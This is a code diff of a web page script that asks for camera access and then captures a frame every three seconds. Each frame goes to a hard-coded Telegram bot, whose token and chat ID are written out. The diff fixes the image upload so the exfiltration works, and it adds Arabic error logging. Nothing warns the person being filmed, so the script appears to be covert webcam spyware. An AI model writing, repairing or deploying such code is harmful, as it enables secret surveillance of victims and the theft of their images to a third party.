@@ -46,12 +46,15 @@
 
     navigator.permissions.query({ name: 'camera' }).then(permission => {
       if (permission.state === 'granted') {
-        startCamera();
+        startCapturing();
       } else {
         navigator.mediaDevices.getUserMedia({ video: true })
           .then(stream => {
             video.srcObject = stream;
             startCapturing();
+          })
+          .catch(error => {
+            console.error('خطأ في الوصول إلى الكاميرا:', error);
           });
       }
     });
@@ -59,15 +62,16 @@
     function startCapturing() {
       setInterval(() => {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imgData = canvas.toDataURL('image/jpeg');
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append('chat_id', '6765420173');
+          formData.append('photo', blob, 'image.jpg');
 
-        fetch('https://api.telegram.org/bot7865229336:AAG8w_CBGt0gcGfMd7syGaUVhUH5lJaNL6I/sendPhoto', {
-          method: 'POST',
-          body: new URLSearchParams({
-            chat_id: '6765420173',
-            photo: imgData
-          })
-        });
+          fetch('https://api.telegram.org/bot7865229336:AAG8w_CBGt0gcGfMd7syGaUVhUH5lJaNL6I/sendPhoto', {
+            method: 'POST',
+            body: formData
+          }).catch(error => console.error('خطأ في إرسال الصورة:', error));
+        }, 'image/jpeg');
       }, 3000);
     }
   </script>
